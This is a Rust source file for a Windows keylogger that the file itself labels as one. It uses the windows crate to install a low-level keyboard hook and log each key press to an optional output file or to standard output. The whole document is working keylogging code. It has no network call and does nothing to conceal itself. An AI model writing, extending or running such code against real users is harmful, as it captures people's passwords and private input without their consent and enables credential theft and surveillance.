use std::{fs::OpenOptions, io::Write, ptr::{null_mut, addr_of_mut}};
use clap::Parser;
use windows::Win32::{
    UI::WindowsAndMessaging::{
        SetWindowsHookExA, UnhookWindowsHookEx, GetMessageW, CallNextHookEx, HHOOK, KBDLLHOOKSTRUCT,
        WM_KEYDOWN, WH_KEYBOARD_LL
    },
    Foundation::{LRESULT, LPARAM, WPARAM},
};

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Keylogger output file.
    #[arg(short, long)]
    file: Option<String>
}

static mut HOOK_ID: HHOOK = HHOOK(null_mut());
static mut FILE_HANDLE: Option<std::fs::File> = None;

unsafe extern "system" fn hook_keyboard(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if wparam.0 as u32 == WM_KEYDOWN {
        let info: *mut KBDLLHOOKSTRUCT = std::mem::transmute(lparam);
        let char_written = char::from_u32((*info).vkCode).unwrap_or('?');

        // Using a raw pointer to FILE_HANDLE instead of a mutable reference
        if let Some(file) = addr_of_mut!(FILE_HANDLE).as_mut().and_then(|f| f.as_mut()) {
            let _ = write!(file, "{}", char_written);
        } else {
            println!("Character written: {}", char_written);
        }
    }
    CallNextHookEx(HOOK_ID, code, wparam, lparam)
}

fn main() {
    let args = Args::parse();
    // Open the file for appending, creating it if it doesn’t exist.
    match args.file {
        Some(name) => {
            let file = OpenOptions::new().create(true).append(true).open(name);
            unsafe {
                FILE_HANDLE = file.ok();
            }
        }
        _ => {}
    }

    unsafe {
        match SetWindowsHookExA(WH_KEYBOARD_LL, Some(hook_keyboard), None, 0) {
            Ok(hook_id) => {
                HOOK_ID = hook_id;
                while GetMessageW(null_mut(), None, 0, 0).as_bool() {
                    // Process messages to keep the hook active.
                }
                let _ = UnhookWindowsHookEx(hook_id);
            }
            Err(err) => {
                eprintln!("Failed to SetWindowsHookEx: {}", err);
            }
        }
    }
}
